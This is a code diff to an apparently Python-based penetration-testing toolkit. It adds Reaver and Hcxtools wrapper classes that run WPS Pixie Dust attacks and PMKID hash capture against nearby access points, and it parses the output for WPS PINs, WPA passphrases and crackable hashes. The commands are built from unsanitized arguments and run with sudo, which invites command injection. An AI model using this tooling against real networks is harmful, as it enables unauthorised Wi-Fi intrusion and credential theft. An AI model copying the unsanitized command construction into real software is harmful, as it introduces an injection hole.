@@ -111,7 +111,12 @@ class AircrackSuite:
         interfaces = []
         current = {}
         for line in result.stdout.splitlines():
-            if line and not line.startswith(" "):
+            if "no wireless extensions" in line:
+                if current:
+                    interfaces.append(current)
+                    current = {}
+                continue
+            if line and not line.startswith(" ") and not line.startswith("\t"):
                 if current:
                     interfaces.append(current)
                 iface = line.split()[0]
@@ -550,3 +555,79 @@ class Ettercap:
             "output": result.stdout[-3000:],
         }
 
+
+class Reaver:
+    """Wrapper around Reaver and Bully for WPS attacks (Pixie Dust and Bruteforce)."""
+
+    def __init__(self, layer: NativeLayer):
+        self.layer = layer
+
+    def pixie_dust(self, interface: str, bssid: str, *, channel: int, timeout: int = 120) -> dict:
+        """Run a WPS Pixie Dust attack using reaver."""
+        cmd = f"reaver -i {interface} -b {bssid} -c {channel} -K 1 -vv"
+        result = self.layer.run(cmd, sudo=True, timeout=timeout)
+        
+        found_pin = False
+        pin = ""
+        wpa_psk = ""
+        
+        for line in result.stdout.splitlines():
+            if "WPS PIN:" in line:
+                found_pin = True
+                match = re.search(r"WPS PIN:\s*'(.+?)'", line)
+                if match:
+                    pin = match.group(1)
+            if "WPA PSK:" in line:
+                match = re.search(r"WPA PSK:\s*'(.+?)'", line)
+                if match:
+                    wpa_psk = match.group(1)
+                    
+        return {
+            "command": cmd,
+            "success": found_pin,
+            "pin": pin,
+            "wpa_psk": wpa_psk,
+            "output": result.stdout[-2000:]
+        }
+
+
+class Hcxtools:
+    """Wrapper around hcxdumptool and hcxpcapngtool for clientless PMKID attacks."""
+
+    def __init__(self, layer: NativeLayer):
+        self.layer = layer
+
+    def capture_pmkid(self, interface: str, output_pcapng: str, *, timeout: int = 600) -> dict:
+        """Run hcxdumptool to capture PMKID hashes from nearby APs."""
+        cmd = f"timeout {timeout} hcxdumptool -i {interface} -o {output_pcapng} --enable_status=15"
+        result = self.layer.run(cmd, sudo=True, timeout=timeout + 10)
+        
+        return {
+            "command": cmd,
+            "output": result.stdout[-2000:],
+            "stderr": result.stderr[-2000:]
+        }
+
+    def extract_hashes(self, pcapng_file: str, output_hash_file: str) -> dict:
+        """Extract crackable hashes (hc22000 format) from a pcapng using hcxpcapngtool."""
+        cmd = f"hcxpcapngtool -o {output_hash_file} {pcapng_file}"
+        result = self.layer.run(cmd, timeout=30)
+        
+        pmkid_count = 0
+        eapol_count = 0
+        
+        for line in result.stdout.splitlines():
+            if "PMKID(s) written" in line:
+                match = re.search(r"(\d+)\s+PMKID", line)
+                if match: pmkid_count = int(match.group(1))
+            if "EAPOL message pairs written" in line or "EAPOL M1/M2" in line:
+                match = re.search(r"(\d+)\s+EAPOL", line)
+                if match: eapol_count = int(match.group(1))
+                
+        return {
+            "command": cmd,
+            "success": pmkid_count > 0 or eapol_count > 0,
+            "pmkid_count": pmkid_count,
+            "eapol_count": eapol_count,
+            "output": result.stdout
+        }
